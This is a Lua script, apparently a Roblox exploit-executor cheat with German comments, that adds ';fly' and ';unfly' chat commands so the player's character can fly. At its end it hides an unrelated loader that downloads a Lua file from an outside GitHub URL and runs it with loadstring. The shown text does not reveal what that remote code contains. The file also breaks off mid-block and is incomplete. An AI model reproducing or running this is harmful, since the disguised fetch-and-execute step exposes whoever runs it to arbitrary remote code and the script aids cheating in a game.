local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local camera = workspace.CurrentCamera

local flying = false
local flySpeed = 50 -- Standardgeschwindigkeit
local bv, bg -- BodyVelocity und BodyGyro

-- Funktion zum Starten/Stoppen
local function toggleFly(state, speed)
	flying = state
	if speed then flySpeed = math.clamp(speed, 1, 15) * 10 end
	
	if flying then
		local root = character:FindFirstChild("HumanoidRootPart")
		if not root then return end
		
		-- Physik-Objekte für stabiles Fliegen
		bg = Instance.new("BodyGyro")
		bg.P = 9e4
		bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.CFrame = root.CFrame
		bg.Parent = root
		
		bv = Instance.new("BodyVelocity")
		bv.Velocity = Vector3.new(0, 0, 0)
		bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
		bv.Parent = root
		
		character.Humanoid.PlatformStand = true
	else
		if bv then bv:Destroy() end
		if bg then bg:Destroy() end
		character.Humanoid.PlatformStand = false
	end
end

-- Chat Commands
player.Chatted:Connect(function(msg)
	local args = string.split(msg:lower(), " ")
	if args[1] == ";fly" then
		local speed = tonumber(args[2]) or 5
		toggleFly(true, speed)
	elseif args[1] == ";unfly" then
		toggleFly(false)
	end
end)

-- Bewegungs-Loop
RunService.RenderStepped:Connect(function()
	if flying and character:FindFirstChild("HumanoidRootPart") then
		local root = character.HumanoidRootPart
		local moveDir = character.Humanoid.MoveDirection -- Erkennt W/A/S/D, Thumbstick & Controller automatisch
		
		-- Bewegung relativ zur Kamera-Blickrichtung (Hoch/Runter inklusive)
		local lookVector = camera.CFrame.LookVector
		local rightVector = camera.CFrame.RightVector
		
		-- Steuerung berechnen
		local targetVelocity = Vector3.new(0,0,0)
		if moveDir.Magnitude > 0 then
			targetVelocity = camera.CFrame:VectorToWorldSpace(Vector3.new(moveDir.X, 0, moveDir.Z)) * flySpeed
		end
		
		bv.Velocity = targetVelocity
		bg.CFrame = camera.CFrame
	end
end)
-- Script zum Laden des externen Inhalts
local scriptURL = "https://raw.githubusercontent.com/leckaxri/Epsteinmain.lua/refs/heads/main/Kakamain.lua"

local success, content = pcall(function()
    return game:HttpGet(scriptURL)
end)

if success then
    -- Führt das geladene Script aus
    local execute = loadstring(content)
    if execute then
        execute()
    else
        warn("Das Script konnte nicht geladen werden (Syntaxfehler).")
    end
else
    warn("Fehler beim Abrufen der URL: " .. tostring(content))
